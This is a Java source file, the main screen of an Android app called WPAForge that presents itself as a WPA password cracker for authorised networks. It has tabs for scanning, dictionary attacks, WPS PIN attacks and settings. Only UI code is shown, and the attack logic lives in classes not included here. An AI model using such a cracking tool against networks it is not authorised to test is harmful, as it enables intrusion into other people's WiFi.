package io.github.wlmosv_png.wpaforge;

import android.Manifest;
import android.app.Activity;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.graphics.Typeface;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.text.TextUtils;
import android.view.Gravity;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.EditText;
import android.widget.HorizontalScrollView;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;
import android.widget.FrameLayout;
import android.widget.ImageView;
import android.widget.Toast;

import java.io.File;
import java.util.ArrayList;
import java.util.List;

import io.github.wlmosv_png.wpaforge.audit.AuditEngine;
import io.github.wlmosv_png.wpaforge.ui.DictIcons;
import io.github.wlmosv_png.wpaforge.audit.Candidate;
import io.github.wlmosv_png.wpaforge.audit.DictGenerator;
import io.github.wlmosv_png.wpaforge.audit.RootProber;
import io.github.wlmosv_png.wpaforge.audit.HistStore;
import io.github.wlmosv_png.wpaforge.audit.SavedWifiReader;
import io.github.wlmosv_png.wpaforge.audit.SmartSorter;
import io.github.wlmosv_png.wpaforge.audit.TaskQueue;
import io.github.wlmosv_png.wpaforge.audit.TargetDictBuilder;
import io.github.wlmosv_png.wpaforge.core.NetRecord;
import io.github.wlmosv_png.wpaforge.scan.ChannelAnalyzer;
import io.github.wlmosv_png.wpaforge.scan.ScanDetail;
import io.github.wlmosv_png.wpaforge.scan.Scanner;
import io.github.wlmosv_png.wpaforge.scan.SsidGroup;
import io.github.wlmosv_png.wpaforge.ui.ChannelBars;
import io.github.wlmosv_png.wpaforge.ui.RadarSweep;
import io.github.wlmosv_png.wpaforge.ui.AmberTheme;
import io.github.wlmosv_png.wpaforge.ui.AuthorCard;
import io.github.wlmosv_png.wpaforge.ui.NetDialog;
import io.github.wlmosv_png.wpaforge.ui.StagedProgress;

/**
 * 主界面。四个页签：观测 / 审计 / 试连 / 设置。
 * 全部代码构建，不带 XML 布局资源，视觉上与原版形态完全分离。
 */
public class MainActivity extends Activity {

    // 配色：琥珀主色 + 近黑背景，与常见的蓝紫渐变彻底分开。
    //
    // Obsidian Amber 重构：数值统一收敛到 ui/AmberTheme，这里只保留**字段名**，
    // 于是其它页面的引用一处都不用改，而三档表面（页面 / 卡片 / 凹陷）
    // 从此只有一个出处。语义色（成功 / 错误）保持原色相，只是统一了同色系暗底。
    private static final int BG        = AmberTheme.BG;
    private static final int SURFACE   = AmberTheme.CARD;
    private static final int ACCENT    = AmberTheme.ACCENT;
    private static final int TEXT      = AmberTheme.TEXT;
    private static final int TEXT_DIM  = AmberTheme.TEXT_DIM;
    private static final int DANGER    = AmberTheme.DANGER;
    private static final int OK_GREEN  = AmberTheme.OK;

    /* ---------- 按钮色板（只有这四档，别再加第五种） ---------- */
    /** 次操作底：暗面，比 SURFACE 亮一点点，够区分但不抢眼 */
    private static final int BTN_2ND_BG   = AmberTheme.BTN_2ND_BG;
    /** 次操作描边：极淡的白，靠它把暗底从背景里托起来 */
    private static final int BTN_2ND_EDGE = AmberTheme.BTN_2ND_EDGE;
    /** 主操作文字色（琥珀底上必须用深色，白字对比度不够） */
    private static final int ON_ACCENT    = AmberTheme.ON_ACCENT;
    /** 凹陷面（日志区等）：比页面还暗，形成「凹进去」的层次 */
    private static final int SUNKEN       = AmberTheme.SUNKEN;
    /** 卡片描边 */
    private static final int CARD_EDGE    = AmberTheme.EDGE;

    private LinearLayout root;
    private LinearLayout content;          // 外层（竖直排列 4 个 page）
    private LinearLayout pageObserve;      // 观测页容器（建一次）
    private LinearLayout pageAudit;
    private LinearLayout pageConnect;
    private LinearLayout pageSettings;
    private boolean[] pageBuilt = new boolean[5];   // 是否已构建过
    private TextView tabObserve, tabAudit, tabConnect, tabWps, tabSettings;

    private Scanner scanner;
    private final Handler ui = new Handler(Looper.getMainLooper());

    // 观测页组件
    private RadarSweep radar;
    /** 信号分布板：五档统计 + 最强若干台的横向条（不再用单调柱状图）。 */
    private LinearLayout signalBoard;
    /** 雷达卡下面的「关键数字」行（每次扫描后重填） */
    private LinearLayout radarStatsBox;
    /**
     * 雷达卡头部：**一行纯状态文字** —— 只说「什么时候扫的」。
     *
     * <p>演进过程（用户三次明确意见，别再往回改）：
     * ① 带底框的按钮 →「不好那个按钮了，文字可以保留」；
     * ② 整行可点 + 「轻点刷新」+ 倒计时 →「不用点击更新了，就显示啥时候扫描的就行了」。
     * 所以现在是**不可点**的纯信息行：扫描由后台轮询自己维持，
     * 用户不需要（也不应该）去操心系统那 30 秒的频率限制。
     */
    private TextView radarStatus;
    /** 上次扫描的 BSSID 集合，用来算「新增 / 消失」 */
    private java.util.List<String> lastBssids;
    private io.github.wlmosv_png.wpaforge.scan.ScanDiff.Result lastDiff;
    /** 1 秒一跳的文案刷新（只有观测页在前台时才跑） */
    private final Runnable statusTick = new Runnable() {
        @Override public void run() {
            if (currentTab == 0) updateRadarStatus();
            ui.postDelayed(this, 1000);
        }
    };
    private ChannelBars channelBars;
    private LinearLayout netList;
    /** 观测页的已存 WiFi 卡片；缓存上次结果，不重复读 root */
    private TextView savedWifiCard;
    private int savedWifiTotal = -1;
    private int savedWifiWeak = -1;
    private TextView observeNotice;
    /** 信道建议卡（观测页，信道占用图下方） */
    private TextView adviceCard;
    private List<NetRecord> lastRecords = new ArrayList<>();

    // 审计页组件
    private TextView dictStatus;
    /** 设置页的模式说明卡片（切模式后要刷新） */
    private TextView modeInfo;
    /** 设置页里的“当前模式能不能用”小字 */
    private TextView modeReadyLabel;
    private TextView auditLog;
    /** 强度检查的就地结论（与写进日志的那条同源）。 */
    private TextView auditCheckResult;
    /** 审计页日志是否已经写过内容（用于空状态占位：写第一条时要把占位清掉）。 */
    private boolean auditLogTouched = false;
    /** 离线校验是否在跑（同一时间只允许一条） */
    private boolean offlineBusy = false;
    private List<Candidate> currentDict;
    private String currentDictName = "";
    /**
     * 当前字典的**来源代码**（不是显示文案，避免中英切换后比较失效）。
     * 用途只有一个：字典来源弹窗里把"现在用的是哪个"标出来，
     * 以及破解页那行显示成「当前字典: 画像派生 · 53 条」。
     */
    private String currentDictSource = "";
    private static final String SRC_PROFILE = "profile";
    private static final String SRC_GENERIC = "generic";
    private static final String SRC_FILE = "file";
    /** 通用生成器的条数是确定的，算一次就缓存 */
    private int genericDictCount = 0;
    /**
     * 当前字典里**本目标已经跑过**的条数（-1 = 还没算）。
     * 它必须显示在界面上，不能只写日志 —— 用户不看日志的话，
     * 看到"3000 条的字典只跑了 1200 条"只会以为程序坏了。
     */
    private int currentDictSkipped = -1;
    private AuditEngine engine;

    // 试连页组件
/** 明文备份清理行（只在备份存在时创建）。 */
    private Button plainBakBtn;
    private Button languageBtn;
    private ScrollView mainScroll;
    private TextView connectModeView;
    private TextView connectEmptyHint;
    private TextView connectDictView;
    private TextView smartToggle;
    private TextView targetDictToggle;
    private boolean smartSortEnabled = false;
    private boolean targetDictEnabled = false;
    private Button startBtn;
    private Button pauseBtn;
    private Button stopBtn;
    private io.github.wlmosv_png.wpaforge.ui.StagedProgress connectProgress;

    /* ─────────── Obsidian Amber 重构新增的展示位 ───────────
     * 全部只是「往哪里写」，数据一律来自原有的业务回调与字段：
     *   · 目标 / 字典 / 通道  → 原有的 updateTargetLabel / updateConnectDict / updateConnectMode
     *   · 已完成 / 总数 / 完成度 / 速率 / 剩余
     *                        → onProgress(tested, total, rate, etaMs) 里**原样**传进来的值
     *   · 当前状态           → 队列里任务的真实 state + 服务是否在跑
     * 这里不计算任何业务数字，也不新增状态位。
     */
    private TextView netMetaView;        /** 网络卡第二层：信号 · 信道 · 频段 */
    private TextView netSecChip;         /** 安全类型胶囊 */
    private TextView statDoneView;       /** 已完成 */
    private TextView statTotalView;      /** 总数 */
    private TextView statPctView;        /** 完成度（大数字） */
    private TextView statRateView;       /** 速率（条/分，来自同一次回调） */
    private TextView statEtaView;        /** 剩余时间（来自同一次回调） */
    private TextView stateBig;           /** 当前状态（大字） */
    private TextView actionsHint;        /** 底部可用性说明 */
    private LinearLayout progressCard;   /** 任务进度卡 */
    private LinearLayout eventCard;      /** 状态与事件卡 */
    private LinearLayout actionsCard;    /** 底部操作卡 */
    /** 最近一次任务结论（只由 onTaskDone 写入，仅用于显示，不参与任何判定）。 */
    private String lastOutcomeLabel = "";
    private int lastOutcomeColor = TEXT_DIM;
    private TextView connectTargetView;

    // ── 方案 A（驾驶舱）新增：候选窗口 / 命中卡片 / 日志分级 ──
    /** 最近几条候选（正在试 + 上两条） */
    private final io.github.wlmosv_png.wpaforge.ui.CandidateTicker candTicker =
            new io.github.wlmosv_png.wpaforge.ui.CandidateTicker(3);
    private TextView candLabel;
    /** 当前候选（带「顶上来 / 消散」动效）。 */
    private io.github.wlmosv_png.wpaforge.ui.CandidateRoll candRoll;
    private TextView candPrev;
    private LinearLayout candBox;
    /** 命中卡片：产品的巅峰时刻，值得单独一块 */
    private LinearLayout hitCard;

    /* ── 结算卡：跑完之后给出的"结论"，不是一个空状态 ──────────────
     * 破解的常态结果是"没中"。工具的**常态状态**没做好，用户就会觉得是坏的。
     * 所以跑完不再只把状态改成"已结束"，而是换一张有结论、有解释、有下一步的卡。 */
    private LinearLayout resultCard;
    private TextView resultTitle, resultSub, resultWhy;
    private LinearLayout resultActions;
    /** 收尾中：候选跑完了但服务还在恢复临时网络配置 —— 别让界面停在"运行中 100%" */
    private boolean finishingNow = false;
    private TextView finishNote;
    private long finishingStartedAt = 0L;
    /** 服务在收尾结束时给的结论（例：已恢复 : OK），显示在结算卡上 */
    private String lastRestoreSummary = "";

    /**
     * 收尾计时。
     *
     * <p>为什么必须做：收尾里有一段 `ConfigRestorer.waitConnected(ssid, 15000)`
     * —— 要把用户原来的网络写回去、并**轮询最多 15 秒**等它连上。
     * 旧版这段时间界面只有一句"收尾中"，用户不知道在等什么、还要等多久，
     * 进度条还在放流动效 → 看起来就是卡死。
     */
    private final Runnable finishingTick = new Runnable() {
        @Override
        public void run() {
            if (!finishingNow) {
                if (finishNote != null) finishNote.setVisibility(View.GONE);
                return;
            }
            long sec = Math.max(0, (System.currentTimeMillis() - finishingStartedAt) / 1000);
            if (finishNote != null) {
                finishNote.setVisibility(View.VISIBLE);
                finishNote.setText(sec <= 16L
                        ? L.s("破解已经跑完 ✓ 现在把你原来连的那个网写回去，最长等 15 秒"
                                      + "（已等 " + sec + " 秒）",
                              "Cracking is done \u2713 currently restoring the network you were "
                                      + "on before (up to 15s, " + sec + "s elapsed)")
                        : L.s("还在写回原来的网络 · 已等 " + sec + " 秒（超过预期的 15 秒，"
                                      + "细节见攻击流）",
                              "Still restoring the previous network \u00b7 " + sec
                                      + "s (past the 15s estimate, see the stream)"));
            }
            ui.postDelayed(this, 500L);
        }
    };
    private TextView hitPw;
    private TextView hitMeta;
    /** 日志全量（含被筛掉的）；streamBuffer 只是它的「可见视图」 */
    private final java.util.List<LogLine> streamLines = new java.util.ArrayList<>();
    /** true = 只看关键（里程碑 + 失败原因），默认开 */
    /**
     * 日志级别：true = 只看关键，false = 全部。
     *
     * <p>默认改成「全部」—— 关键级别会把逐条候选的结果藏起来，
     * 用户看到的是"跑了半天什么都没发生"。全部视图里每条候选一行，
     * 至少能看出"程序在动、这条不对"。
     */
    private boolean streamKeyOnly = false;
    private TextView chipKey;
    private TextView chipAll;
    private int lastTested = 0, lastTotal = 0;
    /** 当前候选在字典里的位置（1 起）—— 脱敏后靠它把日志对回字典 */
    private int curCandIndex = 0;
    private TextView connectStatsView;
    private TextView connectStreamView;
    /** 候选流折叠：头部、箭头、行数、布局参数 */
    private LinearLayout flowHeader;
    private TextView flowChevron;
    private TextView flowLabel;
    private TextView flowCount;
    private TextView flowClear;
    /** 日志区的滚动容器：可滚动 + 自动跟随 */
    private android.widget.ScrollView streamScroll;
    /** 日志区的外层容器（FrameLayout）。高度控制在这里 ——
     *  streamScroll 在里面是 MATCH_PARENT，不直接设 params。
     *  直接给 streamScroll 设 LinearLayout 的 params 会在 FrameLayout
     *  测量时抛 ClassCastException。 */
    private android.widget.FrameLayout streamWrapView;
    /** 是否自动跟随到底部（用户上滑后关闭） */
    private boolean streamAutoScroll = true;
    /** 日志区的「回到最新」浮标：用户上滑看历史时出现 */
    private TextView jumpLatestBtn;
    private LinearLayout.LayoutParams streamParams;
    private boolean streamCollapsed = false;
    private RootProber rootProber;
    private volatile boolean rootProberRunning = false;
    private NetRecord targetNet;
    /** 设置页两个连接开关（状态直接写在按钮文案上） */
    private Button connPinBtn, connRotBtn;
    /** 设置页「保活状态」卡片 */
    private TextView keepAliveLabel;
    private Thread connectThread;

    // 服务绑定
    private CrackService crackService;
    private boolean serviceBound = false;
    private final java.util.List<TaskQueue.Task> queueCache = new java.util.ArrayList<>();
    /** 当前用作字典的文件路径（空表示用内置生成器） */
    private String currentDictPath = "";
    /**
     * 字典条数的**显示值**。
     *
     * <p>为什么单独存一个：回前台时界面可能只从任务里拿得到「名字 + 条数」
     * （候选列表要读盘、可能几 MB），没必要为了显示一个数字先卡住界面。
     * 列表补齐后会覆盖它。
     */
    private int dictSizeShown = 0;
    /** 是否正在后台补齐候选列表（防止重复触发读盘）。 */
    private boolean dictReloading = false;
    private LinearLayout queueBox;
    /** 设置页里的权限状态行（授权后要刷新） */
    private TextView permLabel;
    /** 「去系统设置里允许」按钮；权限齐全时隐藏 */
    private Button permFixBtn;


    private int currentTab = 0;
    private float dp;
    /** 列表里的小字档（BSSID / 等级 / 胶囊）：比正文再小一档。 */
    private static final float FS_TINY = 10f;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        L.init(this);
        dp = getResources().getDisplayMetrics().density;
        buildUi();
        requestPermsIfNeeded();
        scanner = new Scanner(this, scanListener);
        bindCrackService();
        requestNotifPermission();
        if (Prefs.pinEnabled(this)) setupPinGate();
    }

    /** PIN 锁遮挡层：设了 PIN 就先解锁才能用 */
    private android.widget.FrameLayout pinGate = null;

    private void setupPinGate() {
        android.widget.FrameLayout root = (android.widget.FrameLayout)
                ((android.view.ViewGroup) getWindow().getDecorView()
                        .findViewById(android.R.id.content));
        if (root == null) return;
        pinGate = new android.widget.FrameLayout(this);
        pinGate.setBackgroundColor(AmberTheme.SCRIM);
        pinGate.setClickable(true);
        pinGate.setFocusable(true);

        android.widget.LinearLayout box = new android.widget.LinearLayout(this);
        box.setOrientation(android.widget.LinearLayout.VERTICAL);
        android.widget.FrameLayout.LayoutParams bp = new android.widget.FrameLayout.LayoutParams(
                android.view.ViewGroup.LayoutParams.MATCH_PARENT,
                android.view.ViewGroup.LayoutParams.WRAP_CONTENT);
        bp.setMargins(px(48), 0, px(48), 0);
        bp.gravity = android.view.Gravity.CENTER;
        box.setPadding(0, 0, 0, 0);

        android.widget.TextView t = new android.widget.TextView(this);
        t.setText(L.s("WPAForge 已锁定\n输入 PIN 解锁",
                "WPAForge locked\nEnter PIN to unlock"));
        t.setTextSize(16);
        t.setTextColor(0xFFFFFFFF);
        t.setGravity(android.view.Gravity.CENTER);
        t.setPadding(0, 0, 0, px(20));
        box.addView(t);

        final android.widget.EditText pin = new android.widget.EditText(this);
        pin.setHint(L.s("PIN", "PIN"));
        pin.setInputType(android.text.InputType.TYPE_CLASS_NUMBER
                | android.text.InputType.TYPE_NUMBER_VARIATION_PASSWORD);
        pin.setTextSize(18);
        pin.setGravity(android.view.Gravity.CENTER);
        box.addView(pin);

        android.widget.Button ok = new android.widget.Button(this);
        ok.setText(L.s("解锁", "Unlock"));
        ok.setOnClickListener(v -> {
            if (Prefs.checkPin(this, pin.getText().toString())) {
                root.removeView(pinGate);
                pinGate = null;
            } else {
                pin.setText("");
                pin.setHint(L.s("PIN 错误", "Wrong PIN"));
                android.widget.Toast.makeText(this,
                        L.s("PIN 错误", "Wrong PIN"), android.widget.Toast.LENGTH_SHORT).show();
            }
        });
        box.addView(ok, new android.widget.LinearLayout.LayoutParams(
                android.view.ViewGroup.LayoutParams.MATCH_PARENT,
                android.view.ViewGroup.LayoutParams.WRAP_CONTENT));

        pinGate.addView(box, bp);
        root.addView(pinGate, new android.widget.FrameLayout.LayoutParams(
                android.view.ViewGroup.LayoutParams.MATCH_PARENT,
                android.view.ViewGroup.LayoutParams.MATCH_PARENT));
    }

    /** PIN 设置对话框（设置页调用）：新 PIN 两遍确认 */
    private void showPinSetup() {
        if (Prefs.pinEnabled(this)) {
            // 已设置 → 先验证旧 PIN
            final android.widget.EditText old = new android.widget.EditText(this);
            old.setHint(L.s("当前 PIN", "Current PIN"));
            old.setInputType(android.text.InputType.TYPE_CLASS_NUMBER
                    | android.text.InputType.TYPE_NUMBER_VARIATION_PASSWORD);
            new android.app.AlertDialog.Builder(this)
                    .setTitle(L.s("修改 PIN", "Change PIN"))
                    .setView(old)
                    .setPositiveButton(L.s("下一步", "Next"), (d, w) -> {
                        if (Prefs.checkPin(this, old.getText().toString())) {
                            askNewPin();
                        } else {
                            Toast.makeText(this, L.s("当前 PIN 错误", "Wrong current PIN"),
                                    Toast.LENGTH_SHORT).show();
                        }
                    })
                    .setNegativeButton(L.s("取消", "Cancel"), null)
                    .show();
            return;
        }
        askNewPin();
    }

    private void askNewPin() {
        final android.widget.EditText p1 = new android.widget.EditText(this);
        p1.setHint(L.s("新 PIN（数字）", "New PIN (digits)"));
        p1.setInputType(android.text.InputType.TYPE_CLASS_NUMBER
                | android.text.InputType.TYPE_NUMBER_VARIATION_PASSWORD);
        new android.app.AlertDialog.Builder(this)
                .setTitle(L.s("设置 PIN", "Set PIN"))
                .setView(p1)
                .setPositiveButton(L.s("确定", "OK"), (d, w) -> {
                    String v = p1.getText().toString().trim();
                    if (v.length() < 4) {
                        Toast.makeText(this, L.s("PIN 至少 4 位", "PIN needs at least 4 digits"),
                                Toast.LENGTH_SHORT).show();
                        return;
                    }
                    Prefs.setPin(this, v);
                    Toast.makeText(this, L.s("PIN 已设置", "PIN set"),
                            Toast.LENGTH_SHORT).show();
                })
                .setNegativeButton(L.s("取消", "Cancel"), null)
                .show();
    }

    private void confirmClearPin() {
        final android.widget.EditText p = new android.widget.EditText(this);
        p.setHint(L.s("当前 PIN", "Current PIN"));
        p.setInputType(android.text.InputType.TYPE_CLASS_NUMBER
                | android.text.InputType.TYPE_NUMBER_VARIATION_PASSWORD);
        new android.app.AlertDialog.Builder(this)
                .setTitle(L.s("清除 PIN", "Remove PIN"))
                .setView(p)
                .setPositiveButton(L.s("清除", "Remove"), (d, w) -> {
                    if (Prefs.checkPin(this, p.getText().toString())) {
                        Prefs.clearPin(this);
                        Toast.makeText(this, L.s("PIN 已清除", "PIN removed"),
                                Toast.LENGTH_SHORT).show();
                    } else {
                        Toast.makeText(this, L.s("PIN 错误", "Wrong PIN"),
                                Toast.LENGTH_SHORT).show();
                    }
                })
                .setNegativeButton(L.s("取消", "Cancel"), null)
                .show();
    }

    private void requestNotifPermission() {
        if (android.os.Build.VERSION.SDK_INT >= 33) {
            if (checkSelfPermission("android.permission.POST_NOTIFICATIONS")
                    != PackageManager.PERMISSION_GRANTED) {
                requestPermissions(new String[]{"android.permission.POST_NOTIFICATIONS"}, 1002);
            }
        }
    }

    private final android.content.ServiceConnection svcConn =
            new android.content.ServiceConnection() {
        @Override
        public void onServiceConnected(android.content.ComponentName name, android.os.IBinder binder) {
            CrackService.LocalBinder lb = (CrackService.LocalBinder) binder;
            crackService = lb.service();
            serviceBound = true;
            crackService.addCallback(svcCallback);
            setRunning(crackService.isWorking());
            refreshQueue();
            // 服务刚绑上：目标/字典可能只存在于服务里（界面被系统重建过）
            restoreSelectionFromAuthority();
        }

        @Override
        public void onServiceDisconnected(android.content.ComponentName name) {
            serviceBound = false;
            crackService = null;
        }
    };

    private void bindCrackService() {
        android.content.Intent i = new android.content.Intent(this, CrackService.class);
        bindService(i, svcConn, BIND_AUTO_CREATE);
    }

    private float dp(float v) { return v * dp; }

    private int px(float v) { return Math.round(v * dp); }

    // ---------------- UI 构建 ----------------

    private void buildUi() {
        root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setBackgroundColor(BG);

        // 顶部标题条
        LinearLayout header = new LinearLayout(this);
        header.setOrientation(LinearLayout.VERTICAL);
        // 方案 A：这一条压扁一点，把纵向空间让给破解页的主区
        header.setPadding(px(22), px(34), px(22), px(2));
        TextView title = new TextView(this);
        title.setText("WPAForge");
        title.setTextSize(20);
        title.setTextColor(TEXT);
        title.setTypeface(Typeface.create("sans-serif-light", Typeface.NORMAL));
        title.setLetterSpacing(0.04f);
        header.addView(title);
        TextView sub = new TextView(this);
        sub.setText(L.s("WPA 密码破解工具 · 仅限自有网络", "WPA password cracker · authorised networks only"));
        sub.setTextSize(10.5f);
        sub.setTextColor(TEXT_DIM);
        header.addView(sub);
        root.addView(header);

        // 页签
        LinearLayout tabs = new LinearLayout(this);
        tabs.setOrientation(LinearLayout.HORIZONTAL);
        tabs.setPadding(px(10), px(2), px(10), px(6));
        tabObserve = makeTab(L.s("观测", "Observe"), 0);
        tabAudit = makeTab(L.s("审计", "Audit"), 1);
        tabConnect = makeTab(L.s("破解", "Crack"), 2);
        tabWps = makeTab(L.s("WPS", "WPS"), 3);
        tabSettings = makeTab(L.s("设置", "Settings"), 4);
        tabs.addView(tabObserve, gapWeight(10));
        tabs.addView(tabAudit, gapWeight(10));
        tabs.addView(tabConnect, gapWeight(10));
        tabs.addView(tabWps, gapWeight(10));
        tabs.addView(tabSettings, gapWeight(0));
        root.addView(tabs);

        // 内容容器（可滚动）
        mainScroll = new ScrollView(this);
        ScrollView sv = mainScroll;
        sv.setFillViewport(true);
        content = new LinearLayout(this);
        content.setOrientation(LinearLayout.VERTICAL);
        // 底部留白：Android 15 上 targetSdk 35 强制 edge-to-edge，手势区占底部 96px
        // （实测 mandatorySystemGestures frame=[0,2280][1080,2376]）。这里先给 32dp=96px
        // 打底，再由下面的 insets 监听叠加系统导航栏高度 —— 两重保险，
        // 即使 insets 拿不到也不会让最后一行落进手势区。
        content.setPadding(px(16), px(8), px(16), px(32));

        // 四个页面各建一次，之后只切换可见性 ——
        // 这样切页签不会丢日志、不会重置滚动、不会丢按钮状态
        pageObserve = new LinearLayout(this);
        pageObserve.setOrientation(LinearLayout.VERTICAL);
        pageAudit = new LinearLayout(this);
        pageAudit.setOrientation(LinearLayout.VERTICAL);
        pageConnect = new LinearLayout(this);
        pageConnect.setOrientation(LinearLayout.VERTICAL);
        pageSettings = new LinearLayout(this);
        pageSettings.setOrientation(LinearLayout.VERTICAL);
        pageWps = new LinearLayout(this);
        pageWps.setOrientation(LinearLayout.VERTICAL);
        content.addView(pageObserve);
        content.addView(pageAudit);
        content.addView(pageConnect);
        content.addView(pageWps);
        content.addView(pageSettings);
        sv.addView(content, new ViewGroup.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT));
        root.addView(sv, new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, 0, 1f));

        setContentView(root);
        showTab(0);

        // 全面屏手势区 / 导航栏：targetSdk 35 在 Android 15 上强制 edge-to-edge，
        // 底部内容会画到手势条下面（改版前实测按钮下沿正好贴到屏幕底边）。
        // 这里按系统下边距给内容补一段 padding —— 只改内边距，不动布局结构。
        // 注意：必须在**视图 attach 之后**读 insets —— 在 setContentView 的同一帧里
        // 调 requestApplyInsets() 拿不到分发（实测漏掉了 48px 的导航栏），
        // 用 post 推到下一帧、并从 root 的 rootWindowInsets 上取。
        try {
            root.post(() -> {
                try {
                    android.view.WindowInsets in = root.getRootWindowInsets();
                    if (in == null || content == null) return;
                    int bottom = in.getSystemWindowInsetBottom();
                    if (bottom > 0) {
                        content.setPadding(px(16), px(8), px(16), px(32) + bottom);
                    }
                } catch (Throwable ignored) {}
            });
        } catch (Throwable ignored) {}
    }

    /** 统一控制"运行中"状态：运行中才能停止，空闲时才能开始 */
    /**
     * 拿当前活着的服务实例。
     * 优先用在 ServiceConnection 里拿到的 binder 实例；
     * 拿不到（绑定未完成 / 被系统解绑）就退回服务的静态引用。
     * 没有这层兜底时，点停止会因为 crackService == null 直接弹
     * "没有正在跑的任务"，表现就是"停不下来"。
     */
    private CrackService liveService() {
        if (crackService != null) return crackService;
        return CrackService.get();
    }

    /**
     * 刷新按钮状态。
     *
     * 唯一真相是「队列里有没有进行中的任务」，不是服务实例上的标志 ——
     * 之前两者会不一致，导致"显示已暂停但按钮还能点开始"这种矛盾。
     */
    private void syncButtons() {
        boolean running = false;
        boolean paused = false;
        for (TaskQueue.Task t : queueCache) {
            if (t.state == TaskQueue.State.RUNNING) running = true;
            if (t.state == TaskQueue.State.PAUSED) paused = true;
        }
        boolean active = running || paused;

        if (startBtn != null) {
            startBtn.setEnabled(!active);
            startBtn.setAlpha(active ? 0.4f : 1f);
            startBtn.setText(active
                    ? L.s("▶ 开始破解", "▶ Start")
                    : L.s("▶ 开始破解", "▶ Start"));
        }
        if (pauseBtn != null) {
            // paused 时按钮文案会变成「继续」，但旧写法只按 running 判断可用性，
            // 于是「已暂停」的任务永远点不动「继续」——用户被卡死在暂停态。
            boolean canPause = running || paused;
            pauseBtn.setEnabled(canPause);
            pauseBtn.setAlpha(canPause ? 1f : 0.4f);
            pauseBtn.setText(paused
                    ? L.s("▶ 继续", "▶ Resume")
                    : L.s("‖ 暂停", "‖ Pause"));
        }
        if (stopBtn != null) {
            stopBtn.setEnabled(active);
            stopBtn.setAlpha(active ? 1f : 0.4f);
        }
    }

    /** 兼容旧调用 */
    private void setRunning(boolean ignored) {
        syncButtons();
    }

    /** 带右侧间隔的等分权重 */
    private LinearLayout.LayoutParams gapWeight(int gapPx) {
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f);
        lp.rightMargin = px(gapPx);
        return lp;
    }

    private LinearLayout.LayoutParams weight() {
        return new LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f);
    }

    /**
     * 顶部导航胶囊。
     *
     * <p>改版前是 5 个 46dp 高的大按钮、每个都带可见描边 —— 三个页签的视觉重量
     * 加起来比内容还重。现在：高度降到 36dp、圆角收小、未选中项**去掉描边**
     * 只留一层极淡的暗底，当前项用实心琥珀 + 深色字。
     * 点按回调与页签索引完全不变。
     */
    private TextView makeTab(String label, int index) {
        TextView t = new TextView(this);
        t.setText(label);
        t.setTextSize(13.5f);
        t.setGravity(Gravity.CENTER);
        t.setPadding(0, px(9), 0, px(9));
        t.setTextColor(AmberTheme.TEXT_FAINT);
        t.setLetterSpacing(0.02f);
        t.setBackground(roundBg(AmberTheme.CARD_2, AmberTheme.RADIUS_TAB));
        t.setOnClickListener(v -> showTab(index));
        return t;
    }

    private void showTab(int index) {
        currentTab = index;

        // 页签样式
        TextView[] tabs = {tabObserve, tabAudit, tabConnect, tabWps, tabSettings};
        for (int i = 0; i < tabs.length; i++) {
            boolean on = (i == index);
            // 选中：实心琥珀 + 深字 + 加粗；未选中：**无描边**的暗底 + 弱字 + 常规。
            // 三处同时变（底、字色、字重）—— 扫一眼就能定位当前页；
            // 未选中项不再画边，五个入口的整体重量因此降下来。
            tabs[i].setBackground(roundBg(on ? ACCENT : AmberTheme.CARD_2,
                    AmberTheme.RADIUS_TAB));
            tabs[i].setTextColor(on ? ON_ACCENT : AmberTheme.TEXT_FAINT);
            tabs[i].setTypeface(on
                    ? Typeface.create("sans-serif-medium", Typeface.NORMAL)
                    : Typeface.DEFAULT);
        }

        LinearLayout[] pages = {pageObserve, pageAudit, pageConnect, pageWps, pageSettings};

        // 首次访问该页时才构建内容
        if (!pageBuilt[index]) {
            switch (index) {
                case 0: buildObserveTab(); break;
                case 1: buildAuditTab(); break;
                case 2: buildConnectTab(); break;
                case 3: buildWpsTab(); break;
                default: buildSettingsTab(); break;
            }
            pageBuilt[index] = true;
        }

        // 只切可见性
        for (int i = 0; i < pages.length; i++) {
            pages[i].setVisibility(i == index ? View.VISIBLE : View.GONE);
        }

        // 离开观测页时停扫描与动画
        if (index == 0) {
            if (radar != null) radar.startSpin();
            if (scanner != null) scanner.start();
            ui.removeCallbacks(statusTick);
            ui.post(statusTick);
        } else {
            ui.removeCallbacks(statusTick);
            if (radar != null) radar.stopSpin();
            if (scanner != null) scanner.stop();
        }
        updateRadarStatus();

        // 回到破解页：刷新队列与日志（内容不用重建）
        if (index == 2) {
            refreshQueue();
            if (connectStreamView != null && !streamLines.isEmpty()) {
                // 用渲染器重设：既保住每行的颜色，也保持当前筛选一致。
                renderStream();
            }
            updateConnectDict();
            updateConnectMode();
            updateTargetLabel();
        }
    }

    // ---------------- 观测页 ----------------


    // ==================== WPS PIN 模式（第 5 页） ====================

    private LinearLayout pageWps;
    private LinearLayout wpsTargetList;
    private TextView wpsPickedLine;
    private TextView wpsStatusLine;
    private TextView wpsProgressLine;
    private LinearLayout wpsModeList;
    /** 扫描进度：一条细的不确定进度线 + 一行阶段文字（替代原来的大转圈）。 */
    private android.widget.ProgressBar wpsScanBar;
    private TextView wpsScanStatus;
    private Button wpsReconAllBtn;
    /** 体检是否连「不收外部 PIN」的一起测。默认跳过 —— 实测那批 3/3 打不动。 */
    private boolean wpsReconAll = false;
    private Button wpsStartBtn;
    private Button wpsStopBtn;
    private TextView wpsLogView;
    private TextView wpsImportLine;

    private final java.util.List<io.github.wlmosv_png.wpaforge.wps.WpsController.Target> wpsTargets
            = new java.util.ArrayList<>();
    private io.github.wlmosv_png.wpaforge.wps.WpsController.Target wpsPicked;
    private io.github.wlmosv_png.wpaforge.wps.WpsEngine.Session wpsSession;

    private volatile boolean wpsRunning = false;
    private volatile boolean wpsCancel = false;
    /** 策略：false = 弱 PIN 优先；true = 完整枚举 */
    private int wpsMode = 0;
